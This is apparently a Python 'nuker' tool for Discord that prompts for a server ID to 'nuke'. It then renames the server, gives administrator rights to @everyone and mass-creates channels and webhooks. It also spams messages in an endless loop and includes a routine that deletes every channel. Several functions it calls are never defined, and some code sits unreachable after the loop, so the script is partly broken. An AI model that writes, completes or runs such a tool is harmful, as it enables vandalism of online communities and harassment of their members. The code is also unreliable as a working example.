import discord
import asyncio
import os
import json
import keyboard
from colorama import Fore

# Function to generate color gradient
def generate_gradient(start_color, end_color, length):
    gradient = []
    for i in range(length):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * i / length)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * i / length)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * i / length)
        gradient.append((r, g, b))
    return gradient

# Color transition text art
text_art = r"""
                                      _   __     __     _   __      __            
                                     / | / /__  / /_   / | / /_  __/ /_____  _____
                                    /  |/ / _ \/ __/  /  |/ / / / / //_/ _ \/ ___/
                                   / /|  /  __/ /_   / /|  / /_/ / ,< /  __/ /    
                                  /_/ |_/\___/\__/  /_/ |_/\__,_/_/|_|\___/_/     
"""

# Generate color gradient
start_color = (255, 255, 0)  # Yellow
end_color = (255, 0, 0)       # Red
gradient = generate_gradient(start_color, end_color, len(text_art))

# Print text art with color transition
for i, char in enumerate(text_art):
    print(f"\033[38;2;{gradient[i][0]};{gradient[i][1]};{gradient[i][2]}m{char}", end="")
print("\033[0m")  # Reset color

print(Fore.RED + """
                                            Made by Sirusma
                                                Contact:
                                          My Discord: sirusma
                                Server for support: https://discord.gg/nuking""" + Fore.CYAN + """
                                    Press F1 anytime to restart the tool
""")

# Read bot token from file
try:
    with open("bottoken.txt", "r") as file:
        token = file.read().strip()
except FileNotFoundError:
    print(f"{Fore.RED} [!] Bot token file not found.")
    exit()

# Define intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True

async def delete_all_webhooks(server):
    webhooks = await server.webhooks()
    delete_tasks = [webhook.delete() for webhook in webhooks]
    await asyncio.gather(*delete_tasks)

async def delete_all_channels(server):
    for channel in server.channels:
        try:
            await channel.delete()
            print(f"{Fore.CYAN} [+] Channel '{channel.name}' deleted")
        except Exception as e:
            print(f"{Fore.RED} [!] Error deleting channel '{channel.name}': {e}")

async def create_channel_webhook(channel):
    try:
        webhook = await channel.create_webhook(name="Channel Webhook")
        print(f"{Fore.GREEN} [+] Webhook '{webhook.name}' created for channel '{channel.name}'")
        return webhook
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to create a webhook for channel '{channel.name}'")
        return None
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while creating a webhook for channel '{channel.name}': {e}")
        return None

async def send_message_in_channel(channel, message):
    try:
        await channel.send(message)
        print(f"{Fore.YELLOW} [+] Message sent to channel '{channel.name}'")
    except discord.Forbidden:
        print(f"{Fore.RED} [!] Bot doesn't have permission to send messages in channel '{channel.name}'")
    except discord.HTTPException as e:
        if e.status == 429:
            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
        else:
            print(f"{Fore.RED} [!] An error occurred while sending a message in channel '{channel.name}': {e}")

async def change_permissions(server, add_admin):
    everyone_role = discord.utils.get(server.roles, name="@everyone")
    if everyone_role is None:
        print(f"{Fore.RED} [!] Could not find @everyone role.")
        return

    permissions = everyone_role.permissions
    if add_admin:
        permissions.administrator = True
        try:
            await everyone_role.edit(permissions=permissions)
            print(f"{Fore.GREEN} [+] Added administrator permissions to @everyone.")
        except discord.Forbidden:
            print(f"{Fore.RED} [!] Bot doesn't have permission to change role permissions.")
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
            else:
                print(f"{Fore.RED} [!] An error occurred while changing role permissions: {e}")

async def create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount):
    server = client.get_guild(server_id)
    if server is None:
        print(f"{Fore.RED} [!] Server not found.")
        return

    await change_server_name(server, new_server_name)

    if change_notification:
        await change_notification_setting(server, discord.NotificationLevel.all_messages)

    if add_admin:
        await change_permissions(server, True)

    channel_tasks = []

    # Create text channels
    for i in range(1, text_channel_amount + 1):
        new_channel_name = f"{channel_name}-net-{i}"
        channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
        channel_tasks.append(channel_task)

    # Create voice channels
    for i in range(1, voice_channel_amount + 1):
        new_channel_name = f"{channel_name}-net-{i}"
        channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
        channel_tasks.append(channel_task)

    await asyncio.gather(*channel_tasks)

    text_channels = [channel for channel in server.text_channels]

    # Log created channels
    for channel in text_channels:
        print(f"{Fore.CYAN} [+] Text channel '{channel.name}' created")

    # Create webhooks
    webhook_tasks = []
    for channel in text_channels:
        webhook_task = asyncio.ensure_future(create_channel_webhook(channel))
        webhook_tasks.append(webhook_task)

    # Attempt to create webhooks for 10 seconds
    webhook_results, _ = await asyncio.wait(webhook_tasks, timeout=10)
    webhook_results = [task.result() for task in webhook_results]

    # Check if all webhooks were created successfully
    if None in webhook_results:
        print(f"{Fore.RED} [!] Some webhooks could not be created. Skipping message spam.")
    else:
        # Send messages
        while True:
            send_message_tasks = [send_message_in_channel(channel, message) for channel in text_channels]
            await asyncio.gather(*send_message_tasks)

        # Change nicknames
        for member in server.members:
            await change_member_nickname(member, nickname)

async def get_server_id():
    while True:
        server_id = input(f"{Fore.GREEN} [?] Server ID to nuke: \n #> ")
        if server_id.isdigit():
            return int(server_id)
        else:
            print(f"{Fore.RED} [!] Invalid input. Server ID must be a number.")

async def main():
    client = discord.Client(intents=intents)
    
    @client.event
    async def on_ready():
        print(f'{Fore.GREEN}                                  [+] We have logged in as {client.user}\n')
        
        # Load config
        try:
            with open("config.json", "r") as file:
                config = json.load(file)
        except FileNotFoundError:
            print(f"{Fore.RED} [!] Config file not found.")
            return
        except json.JSONDecodeError:
            print(f"{Fore.RED} [!] Invalid JSON format in the config file.")
            return

        # Menu
        while True:
            print(f"{Fore.MAGENTA}                       <1> Preset Nuker         <2> Custom Nuker         <3> Separate Menu")
            print(f"{Fore.YELLOW}  ")
            option = input(f"{Fore.GREEN} Option: \n #> ")

            if option == '1':
                # Use preset nuker
                message, new_server_name, change_notification, add_admin, channel_name, text_channel_amount, voice_channel_amount = await use_preset(config)
                server_id = await get_server_id()
                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                break
            elif option == '2':
                # Custom nuker
                server_id = await get_server_id()
                new_server_name = input(f"{Fore.YELLOW} [?] Please enter the new server name: \n #> ")
                message = input(f"{Fore.YELLOW} [?] Please enter the message you want to send: \n #> ")
                while True:
                    change_notification_input = input(f"{Fore.YELLOW} [?] Do you want to change the notification setting to 'All messages'? (yes/no): \n #> ").lower()
                    if change_notification_input in ['yes', 'no']:
                        change_notification = change_notification_input == 'yes'
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
                while True:
                    add_admin_input = input(f"{Fore.YELLOW} [?] Do you want to add administrator permissions to @everyone? (yes/no): \n #> ").lower()
                    if add_admin_input in ['yes', 'no']:
                        add_admin = add_admin_input == 'yes'
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
                channel_name = input(f"{Fore.YELLOW} [?] Please enter the base name for the new channels: \n #> ")
                while True:
                    text_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of text channels: \n #> ")
                    if text_channel_amount_input.isdigit():
                        text_channel_amount = int(text_channel_amount_input)
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
                while True:
                    voice_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of voice channels: \n #> ")
                    if voice_channel_amount_input.isdigit():
                        voice_channel_amount = int(voice_channel_amount_input)
                        break
                    else:
                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                break
            elif option == '3':
                # Implement separate menu functionality
                print("Separate menu is under construction.")
                break
            else:
                print(f"{Fore.RED} [!] Invalid option. Please select a valid option.")

    await client.start(token)

asyncio.run(main())
